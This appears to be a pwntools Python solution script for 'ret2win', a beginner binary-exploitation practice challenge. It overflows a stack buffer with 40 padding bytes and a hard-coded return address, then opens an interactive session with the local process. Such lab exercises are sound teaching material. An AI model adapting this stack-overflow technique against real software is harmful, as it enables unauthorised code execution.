from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "ret2win"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)


context.binary = e


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
            p = process(f"./{binary_name}")

    win_addr = p64(0x400756)
    payload = b"A" *40 + win_addr
    p.recvuntil(b"read()!")
    p.sendline(payload)
    p.interactive()
main()
